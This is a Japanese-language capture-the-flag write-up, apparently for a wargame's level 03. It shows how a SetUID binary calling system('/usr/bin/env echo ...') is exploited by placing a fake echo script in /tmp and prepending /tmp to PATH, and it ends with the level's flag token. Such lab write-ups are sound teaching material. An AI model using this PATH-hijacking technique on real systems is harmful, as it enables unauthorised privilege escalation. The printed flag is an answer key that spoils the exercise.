# Level 03

## 目的
ユーザー `flag03` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level03` ユーザーでログイン後、ホームディレクトリにある実行ファイル `level03` を確認します。

```bash
ls -l level03
```
出力:
```text
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
このファイルには **SetUID** ビット (`s`) が設定されており、所有者である `flag03` の権限で実行されます。

### 2. 脆弱性の特定

`ltrace` コマンドを使用して、このプログラムがどのようなライブラリ関数を呼び出しているかを確認します。

```bash
ltrace ./level03
```
出力の一部:
```text
system("/usr/bin/env echo Exploit me")
```

このプログラムは `system()` 関数を使い、`/usr/bin/env echo Exploit me` というコマンドを実行していることがわかります。
ここで `env` コマンドは、環境変数 `PATH` から `echo` コマンドを探して実行します。ここに脆弱性があります。

### 3. エクスプロイト（攻撃）

環境変数 `PATH` を操作して、本物の `echo` コマンドの代わりに、攻撃用のスクリプト（偽の `echo`）を実行させます。

1.  **偽の `echo` コマンドの作成**:
    `/tmp` ディレクトリに、`getflag` を実行するスクリプトを `echo` という名前で作成します。
    ```bash
    echo "/bin/getflag" > /tmp/echo
    ```

2.  **実行権限の付与**:
    ```bash
    chmod +x /tmp/echo
    ```

3.  **環境変数の変更と実行**:
    環境変数 `PATH` の先頭に `/tmp` を追加して、プログラムを実行します。
    これにより、システム標準の `/bin/echo` よりも先に `/tmp/echo` が検索され、実行されます。
    ```bash
    export PATH=/tmp:$PATH
    ./level03
    ```

### 4. 結果

プログラムは `flag03` の権限で（偽の）`echo` を実行し、その結果として `getflag` が実行され、トークンが表示されます。

## 結果

### トークン (Flag)
`qi0maab88jeaj46qoumi7maus`
